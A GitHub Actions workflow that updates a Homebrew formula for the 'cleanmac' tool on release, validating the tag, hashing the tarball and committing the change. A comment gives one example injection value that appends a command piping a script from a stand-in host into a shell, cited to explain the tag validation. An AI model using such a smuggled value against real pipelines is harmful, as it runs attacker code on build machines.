name: Update Cleanmac Formula

on:
  release:
    types: [published]

  workflow_dispatch:
    inputs:
      tag:
        description: 'Release tag to update to (e.g., v1.2.0)'
        required: true

jobs:
  update-formula:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    if: github.event_name == 'workflow_dispatch' || contains(github.event.release.tag_name, 'cleanmac') || github.event.release.repository.full_name == 'toshon-jennings/cleanmac'
    steps:
      - name: Checkout tap repo
        uses: actions/checkout@v4

      # Tag names are caller-supplied on both paths. Everything downstream reads
      # $TAG from the environment rather than a ${{ }} expression pasted into a
      # shell command, and the tag has to look like a plain version first — a
      # value like "v1.0; curl evil.sh | sh" would otherwise run on the runner.
      - name: Determine and validate version
        id: version
        env:
          RAW_TAG: ${{ github.event_name == 'workflow_dispatch' && github.event.inputs.tag || github.event.release.tag_name }}
        run: |
          set -euo pipefail
          if ! printf '%s' "$RAW_TAG" | grep -Eq '^v?[0-9]+(\.[0-9]+){0,3}$'; then
            echo "Refusing tag that is not a plain version: $RAW_TAG" >&2
            exit 1
          fi
          echo "tag=$RAW_TAG" >> "$GITHUB_OUTPUT"

      - name: Get tarball sha256
        id: sha
        env:
          TAG: ${{ steps.version.outputs.tag }}
        run: |
          set -euo pipefail
          URL="https://github.com/toshon-jennings/cleanmac/archive/refs/tags/${TAG}.tar.gz"
          SHA=$(curl -sL --fail "$URL" | shasum -a 256 | cut -d' ' -f1)
          echo "sha256=$SHA" >> "$GITHUB_OUTPUT"
          echo "Downloaded and hashed $URL"

      - name: Update formula
        env:
          TAG: ${{ steps.version.outputs.tag }}
          SHA: ${{ steps.sha.outputs.sha256 }}
        run: |
          set -euo pipefail
          FORMULA="Formula/cleanmac.rb"

          sed -i.bak "s|^  url \".*\"|  url \"https://github.com/toshon-jennings/cleanmac/archive/refs/tags/${TAG}.tar.gz\"|" "$FORMULA"
          sed -i.bak "s|^  sha256 \".*\"|  sha256 \"${SHA}\"|" "$FORMULA"
          rm -f "${FORMULA}.bak"

          ruby -c "$FORMULA"

          echo "Updated $FORMULA to $TAG (sha256: $SHA)"

      - name: Commit and push
        env:
          TAG: ${{ steps.version.outputs.tag }}
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add Formula/cleanmac.rb
          git commit -m "chore: update cleanmac to ${TAG}"
          git push
